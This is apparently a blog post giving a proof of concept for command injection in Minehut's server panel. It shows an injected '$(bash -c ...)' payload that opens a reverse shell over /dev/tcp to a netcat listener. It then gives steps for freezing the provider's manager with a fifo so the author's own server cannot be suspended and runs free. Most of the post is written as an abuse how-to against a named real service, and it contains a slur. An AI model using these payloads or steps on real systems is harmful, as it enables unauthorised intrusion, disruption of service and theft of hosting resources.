---
date: 2025-02-07
title: Stupidest RCE I have encounter.
author: furrygang
desc: 'This is probably the stupidest RCE I have encounter.'
tags:
  - poc
  - rce
---

# PoC: RCE From Frontend.

Hello, Recently I have been doing some research with my friend [(OddByte)](https://oddbyte.dev/)

And we have discover an RCE within the panel itself. Leading to us getting shell access directly from the panel.

But due to how they run their containers, We weren't able to get root access.

#### 1. How does it work?

How they run their CTs are a bit weird...

```
Host > VM > CT
```

But, I will be talking about the VM today.

The VM runs something called `minecraft-manager`.

Which basically control everything on your server.

Every POST/GET Request to your server is managed with `minecraft-manager`.

`minecraft-manager` is hosted on the VM itself. 

So If we find a way to crash `minecraft-manager` they wouldn't be able to suspended our server from their admin panel.

The only way the server can be deleted is from them manually `rm -rf`ing it.

#### 2. Actually RCEing the panel.

Let's get to the main point of this blog. RCEing the panel.

This is how it works.

Every server has it's own manager subdomain in a form of

```
[serverID].manager.minehut.com
```
Here is an Example:

![Img](https://i.imgur.com/2juofzG.png)

Now, They have a path to get your startup flags.
```
/v1/game/start_cmd
```

Like this:

![Img](https://i.imgur.com/v0Leg1j.png)

This is so fucking retarded because you can legit just RCE it with
```
$(bash -c 'command here')
```
Also, This does not require any authentications what so ever.

But how do you modified start_cmd?

You can directly modified start_cmd from their panel.

I will be using Seed as an example

Firstly, I will start a netcat server on port 25565 with command
```
nc -lvnp 25565
```

![Img](https://i.imgur.com/4sVVh0z.png)

Then I will go to the panel. And input
```
$(bash -c 'sh -i >& /dev/tcp/IP Address/PORT 0>&1')
```

As the seed, (You can put it on anything. Not limited to seed.)

After that, restart your server and you should be in sh!

![Img](https://i.imgur.com/OOCAxcK.png)

![Img](https://i.imgur.com/MP1TSOl.png)

![Img](https://i.imgur.com/Use07Jz.png)

As you can see, We just did the stupidest RCE ever made.

#### Warning

Doing this can get your server and your account suspended.

Do it as your own risk.

![Img](https://i.imgur.com/Hy0Cv6p.png)

#### 3. Getting 24/7 on free server.

Before doing this. I recommend you having a shell plugin and luckperms with * permission on default group.

This will make your account completely bricked.

After you have shell access. You can make an fifo with
```
mkfifo whatevername
```

After you made a new fifo file.

Open it in the file manager. And minecraft-manager will start freezing.

After a few hours, The API to your server will be timed out.

The panel will stop working and showing no results.

And when you visit
```
api.minehut.com/server/Servername?byName=true
```

It will be timed out

![Img](https://i.imgur.com/OK8T1np.png)

Like this image here. And boom, you have successfully bricked minecraft-manager.

And now you have 24/7 for free!

![Img](https://i.imgur.com/UUGabEK.png)
